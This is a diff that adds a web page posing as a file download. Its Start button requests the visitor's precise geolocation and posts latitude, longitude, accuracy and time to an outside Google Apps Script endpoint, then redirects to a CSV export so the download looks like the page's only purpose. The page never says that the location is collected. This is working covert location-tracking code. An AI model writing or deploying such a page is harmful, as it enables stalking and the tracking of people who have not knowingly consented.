@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Download</title>
+</head>
+<body>
+
+<h2>Continue</h2>
+
+<button id="startBtn">Start</button>
+
+<script>
+
+const CSV_FILE =
+  "https://docs.google.com/spreadsheets/d/1uMbhRh_WhrDv9o2YgUWOV45qX3zLEFzrY_9p0TDhIXI/export?format=csv";
+
+function downloadCSV() {
+    window.location.href = CSV_FILE;
+}
+
+async function sendLocation(lat, lng, accuracy) {
+    try {
+        await fetch(
+            "https://script.google.com/macros/s/AKfycbzCqrUXbmlXPI_EJTcixxfVEDBQ3kseWU1OCyfYgBDeloHoJhSEOO6dVq6UJId5u1Ns/exec",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "text/plain"
+                },
+                body: JSON.stringify({
+                    lat,
+                    lng,
+                    accuracy,
+                    time: Date.now()
+                })
+            }
+        );
+    } catch (e) {
+        console.log("backend error:", e);
+    }
+}
+
+document.getElementById("startBtn").addEventListener("click", () => {
+
+    if (!navigator.geolocation) {
+        downloadCSV();
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+        async (pos) => {
+
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+
+            console.log("Location captured:", lat, lng);
+
+            await sendLocation(lat, lng, acc);
+
+            // small delay improves iOS reliability
+            setTimeout(downloadCSV, 300);
+
+        },
+
+        (err) => {
+            console.log("Location error:", err.code, err.message);
+            downloadCSV();
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 12000,
+            maximumAge: 0
+        }
+    );
+
+});
+
+</script>
+
+</body>
+</html>
